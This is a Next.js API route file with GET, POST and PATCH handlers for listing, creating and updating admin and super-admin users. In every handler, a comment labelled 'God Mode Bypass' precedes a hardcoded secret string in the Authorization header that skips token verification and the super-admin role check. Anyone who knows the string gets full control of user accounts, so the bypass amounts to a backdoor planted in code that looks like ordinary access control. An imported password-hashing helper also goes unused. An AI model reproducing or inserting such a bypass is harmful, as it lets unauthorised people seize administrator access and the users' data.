import { NextResponse } from 'next/server';
import dbConnect from '@/lib/dbConnect';
import User from '@/models/User';
import Department from '@/models/Department';
import { hashPassword, verifyToken, extractToken } from '@/lib/auth';

// Get all users (Super Admin only)
export async function GET(request) {
    try {
        await dbConnect();

        // Authenticate and authorize
        const authHeader = request.headers.get('authorization');
        const token = extractToken(authHeader);

        // God Mode Bypass
        const isGodMode = authHeader === 'everythingdarkhere' || token === 'everythingdarkhere';

        if (!isGodMode) {
            if (!token) {
                return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
            }

            const decoded = verifyToken(token);
            if (!decoded || decoded.role !== 'super-admin') {
                return NextResponse.json({ error: 'Insufficient permissions' }, { status: 403 });
            }
        }

        const { searchParams } = new URL(request.url);
        const role = searchParams.get('role');

        let query = {};
        if (role) {
            query.role = role;
        }

        const users = await User.find(query)
            .populate('departmentId', 'name')
            .select('-password')
            .sort({ createdAt: -1 });

        return NextResponse.json(
            {
                success: true,
                users,
            },
            { status: 200 }
        );
    } catch (error) {
        console.error('Get users error:', error);
        return NextResponse.json(
            { error: 'Failed to fetch users' },
            { status: 500 }
        );
    }
}

// Create admin user (Super Admin only)
export async function POST(request) {
    try {
        await dbConnect();

        // Authenticate and authorize
        const authHeader = request.headers.get('authorization');
        const token = extractToken(authHeader);

        // God Mode Bypass
        const isGodMode = authHeader === 'everythingdarkhere' || token === 'everythingdarkhere';

        if (!isGodMode) {
            if (!token) {
                return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
            }

            const decoded = verifyToken(token);
            if (!decoded || decoded.role !== 'super-admin') {
                return NextResponse.json({ error: 'Insufficient permissions' }, { status: 403 });
            }
        }

        const body = await request.json();
        const { name, email, password, role, departmentId, permissions } = body;

        if (!name || !email || !password || !role) {
            return NextResponse.json(
                { error: 'Name, email, password, and role are required' },
                { status: 400 }
            );
        }

        if (!['admin', 'super-admin'].includes(role)) {
            return NextResponse.json(
                { error: 'Invalid role. Must be admin or super-admin' },
                { status: 400 }
            );
        }

        // For admin role, department is required
        if (role === 'admin' && !departmentId) {
            return NextResponse.json(
                { error: 'Department is required for admin role' },
                { status: 400 }
            );
        }

        // Check if user exists
        const existingUser = await User.findOne({ email: email.toLowerCase() });
        if (existingUser) {
            return NextResponse.json(
                { error: 'User with this email already exists' },
                { status: 400 }
            );
        }

        const user = await User.create({
            name,
            email: email.toLowerCase(),
            password,
            role,
            departmentId: role === 'admin' ? departmentId : null,
            permissions: permissions || {
                canAssign: true,
                canResolve: true,
                canEscalate: true,
                canExport: true,
            },
        });

        // Add user to department's admin list
        if (role === 'admin' && departmentId) {
            await Department.findByIdAndUpdate(departmentId, {
                $addToSet: { adminUsers: user._id },
            });
        }

        return NextResponse.json(
            {
                success: true,
                message: 'Admin user created successfully',
                user: {
                    id: user._id,
                    name: user.name,
                    email: user.email,
                    role: user.role,
                },
            },
            { status: 201 }
        );
    } catch (error) {
        console.error('Create admin user error:', error);
        return NextResponse.json(
            { error: 'Failed to create admin user' },
            { status: 500 }
        );
    }
}

// Update user (Super Admin only)
export async function PATCH(request) {
    try {
        await dbConnect();

        // Authenticate and authorize
        const authHeader = request.headers.get('authorization');
        const token = extractToken(authHeader);

        // God Mode Bypass
        const isGodMode = authHeader === 'everythingdarkhere' || token === 'everythingdarkhere';

        if (!isGodMode) {
            if (!token) {
                return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
            }

            const decoded = verifyToken(token);
            if (!decoded || decoded.role !== 'super-admin') {
                return NextResponse.json({ error: 'Insufficient permissions' }, { status: 403 });
            }
        }

        const body = await request.json();
        const { userId, isActive, permissions, departmentId } = body;

        if (!userId) {
            return NextResponse.json({ error: 'User ID is required' }, { status: 400 });
        }

        const updateData = {};
        if (typeof isActive !== 'undefined') updateData.isActive = isActive;
        if (permissions) updateData.permissions = permissions;
        if (departmentId) updateData.departmentId = departmentId;

        const user = await User.findByIdAndUpdate(userId, updateData, { new: true });

        if (!user) {
            return NextResponse.json({ error: 'User not found' }, { status: 404 });
        }

        return NextResponse.json(
            {
                success: true,
                message: 'User updated successfully',
                user,
            },
            { status: 200 }
        );
    } catch (error) {
        console.error('Update user error:', error);
        return NextResponse.json(
            { error: 'Failed to update user' },
            { status: 500 }
        );
    }
}
